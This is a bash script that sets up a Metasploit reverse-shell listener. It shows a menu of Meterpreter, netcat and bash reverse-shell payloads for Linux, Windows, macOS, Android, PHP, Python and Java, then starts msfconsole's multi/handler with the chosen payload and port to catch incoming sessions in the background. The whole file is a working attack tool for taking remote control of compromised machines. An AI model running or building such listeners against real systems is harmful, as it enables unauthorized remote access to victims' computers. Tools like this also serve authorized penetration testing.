#!/usr/bin/env bash
#
clear
echo "*********************************************"
echo "   METASPLOIT LINUX METERPRETER LISTENER    *"
echo "*********************************************"
echo "Network device list..."
cat /proc/net/dev | tr -s  ' ' | cut -d ' ' -f1,2 | sed -e '1,2d'
echo -e "What network interface are we gonna use ?  \c"
read interface
echo -e "What Port Number are we gonna listen to? : \c"
read port
# Get OS name
OS=`uname`
IO="" # store IP
case $OS in
   Linux) IP=`/sbin/ifconfig $interface  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`;;
   *) IP="Unknown";;
esac


PAYL[0]="linux/x86/meterpreter/reverse_tcp"
PAYL[1]="linux/x64/shell/reverse_tcp"
PAYL[2]="windows/meterpreter/reverse_tcp"
PAYL[3]="windows/meterpreter/reverse_nonx_tcp"
PAYL[4]="windows/x64/meterpreter/reverse_tcp"
PAYL[5]="osx/x86/shell_reverse_tcp"
PAYL[6]="osx/x64/shell_reverse_tcp"
PAYL[7]="php/meterpreter/reverse_tcp"
PAYL[8]="python/meterpreter/reverse_tcp"
PAYL[9]="java/jsp_shell_reverse_tcp"
PAYL[10]="java/meterpreter/reverse_tcp"
PAYL[11]="cmd/unix/reverse_bash"
PAYL[12]="cmd/unix/reverse_netcat"
PAYL[13]="php/reverse_php"
PAYL[14]="windows/vncinject/reverse_tcp"
PAYL[15]="android/meterpreter/reverse_tcp"
PAYL[16]="python/meterpreter/reverse_http"
PAYL[17]="python/meterpreter/reverse_https"
PAYL[18]="python/meterpreter/reverse_tcp_ssl"






THEPAYLOAD=""

echo "What payload would you like to use?"
echo " "

for (( i=0; i<${#PAYL[@]}; i++ ))
do
	echo "$i) ${PAYL[i]}"
done


read SELECTION
FOUND_IN_LIST=0
for (( i=0; i<${#PAYL[@]}; i++ ))
do
	if [[ $SELECTION -eq i ]]; then
		let FOUND_IN_LIST=1
	fi
done
if [[ $FOUND_IN_LIST -eq 1 ]]; then
	clear
	echo "Selecting ${PAYL[$SELECTION]} ..."
	THEPAYLOAD=${PAYL[$SELECTION]}
else
	echo "Invalid selection... ($SELECTION)"
fi


echo "Generated command is..."
echo 'msfconsole -x "use exploit/multi/handler;set payload '$THEPAYLOAD';set LHOST '$IP';set LPORT '$port';exploit"'
#msfconsole -x "use exploit/multi/handler;set payload $THEPAYLOAD;set LHOST $IP;set LPORT $port;exploit"
msfconsole -x "use exploit/multi/handler;set payload $THEPAYLOAD;set LPORT $port; set ExitOnSession false; exploit -j"






